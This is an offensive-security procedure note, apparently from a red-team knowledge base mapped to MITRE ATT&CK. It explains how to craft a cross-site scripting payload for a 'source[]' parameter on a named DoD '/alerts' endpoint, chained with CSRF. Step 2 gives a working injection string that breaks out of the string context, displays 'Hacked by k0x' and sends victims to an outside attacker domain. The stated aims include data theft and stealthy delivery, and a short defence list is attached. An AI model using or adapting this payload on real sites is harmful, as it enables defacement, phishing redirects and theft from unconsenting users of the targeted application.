---
id: p1b2c3d4-e5f6-7890-abcd-ef1234567891
tags:
  - xss
  - javascript
  - payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/xss-payload-injection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:49.609Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-JavaScript-Payload-for-XSS

## Summary

This procedure creates a JavaScript payload for XSS injection via a vulnerable parameter in a web application, exploiting insufficient sanitization to execute code in the victim's browser, such as displaying alerts and redirecting to an attacker site.

## Description

In the context of a CSRF-chained attack on the DoD /alerts endpoint, the 'source[]' parameter lacks proper escaping, allowing closure of a SQL-like string and injection of JavaScript. The payload demonstrates compromise by alerting 'Hacked by k0x' and redirecting after 5 seconds. Prerequisites include understanding the injection point from reconnaissance (e.g., via Burp Suite testing).

## Requirements

1. Knowledge of the target parameter ('source[]') and its context (SQL-like string)
2. Basic JavaScript skills for payload crafting
3. Test environment or proxy tool to validate payload

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding for user inputs
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous JavaScript execution or redirects in browser logs

## Objectives

1. Inject executable JavaScript to prove XSS vulnerability
2. Perform actions like data theft or redirects
3. Chain with CSRF for stealthy delivery

## Instructions

### Step 1: Analyze Injection Point

**Context**: Identify the vulnerable parameter and craft a payload that closes the string context.

No command needed; review application behavior to confirm 'source[]' is unsanitized.

### Step 2: Build and Test Payload

**Context**: Create the JavaScript to execute an alert and delayed redirect.

**Command** ([[commands/xss-payload-injection]]):
```javascript
video");alert('Hacked by k0x');setTimeout(()=>location.href='https://k0x.xyz',5000);//
```

> This payload closes the string with "; executes the alert to show compromise, then uses setTimeout for a 5-second redirect to the attacker's site. Test in a local HTML file or proxy to ensure no syntax errors; expected output is an alert box and page redirect.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/xss-payload-injection]]

## Tools Used


## Tags

- [[xss]]
- [[JavaScript]]
- [[payload]]
